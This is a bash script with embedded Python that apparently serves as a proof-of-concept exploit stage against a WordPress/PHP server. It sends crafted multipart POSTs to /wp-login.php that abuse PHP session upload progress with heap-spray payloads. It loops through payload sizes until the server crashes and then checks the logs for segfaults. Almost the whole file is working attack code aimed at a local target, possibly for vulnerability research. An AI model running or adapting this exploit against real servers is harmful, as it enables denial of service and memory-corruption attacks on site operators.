#!/bin/bash
# FIRE stage at the WP jammy victim (post-arm): fast_fire.py shapes against
# /wp-login.php. Receipted envelope: kill = empty response / conn death.
set -u
SID=wp0123456789abcdefghijklmnopqrstu
python3 - "$SID" <<'PYEOF'
import socket, struct, sys, time
SID = sys.argv[1]
BND = b"UctxPoc2026"
SPRAY_LEN = 8208 - 24 - 1
MARKER = 0x4141414141414141

def zval_spray():
    z = struct.pack("<QII", MARKER, 8, 0)
    return (z * (SPRAY_LEN // 16))[:SPRAY_LEN]

SMALL = struct.pack("<QII", MARKER, 8, 0) + b"\x00" * 8

def part(name, value, filename=None):
    d = b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    return b"--" + BND + b"\r\n" + d + b"\r\n\r\n" + value + b"\r\n"

def fire_body(n_spray, n_small=600):
    o = bytearray()
    o += part(b"PHPSESSID", SID.encode())
    o += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"x")
    z = zval_spray()
    for _ in range(n_spray):
        o += part(b"s[]", z)
    for _ in range(n_small):
        o += part(b"t[]", SMALL)
    o += part(b"f", b"A" * 6144, filename=b"a")
    o += part(b"g", b"B" * 6144, filename=b"b")
    o += b"--" + BND + b"--\r\n"
    return bytes(o)

def blast(body):
    try:
        s = socket.create_connection(("127.0.0.1", 8080), timeout=15)
        s.sendall(
            f"POST /wp-login.php HTTP/1.1\r\nHost: 127.0.0.1:8080\r\n"
            f"Cookie: PHPSESSID={SID}\r\n"
            f"Content-Type: multipart/form-data; boundary={BND.decode()}\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n".encode() + body)
        s.settimeout(15)
        data = b""
        while True:
            try:
                c = s.recv(65536)
            except Exception as e:
                return f"RECV-{type(e).__name__}"
            if not c:
                break
            data += c
        s.close()
        if not data:
            return "EMPTY"
        return data.split(b" ", 2)[1].decode() if b"HTTP/" in data.split(b"\r\n", 1)[0] else "NOHTTP"
    except Exception as e:
        return f"CONN-{type(e).__name__}"

shapes = [150, 250, 350, 450]
bodies = {n: fire_body(n) for n in shapes}
for i in range(40):
    res = blast(bodies[shapes[i % len(shapes)]])
    print(f"fire#{i} fs={shapes[i % len(shapes)]} -> {res}", flush=True)
    if res in ("EMPTY", "NOHTTP") or res.startswith(("CONN-", "RECV-")):
        print(f"==== KILL SIGNATURE at fire#{i}: {res} ====", flush=True)
        break
PYEOF
sleep 1
echo "--- post-fire health (fresh apache -X child = dead server if 000):"
curl -s -o /dev/null -w "front page: %{http_code}\n" --max-time 5 http://127.0.0.1:8080/ || true
grep -iE 'segfault|signal' /tmp/v_wp/error.log 2>/dev/null | tail -2
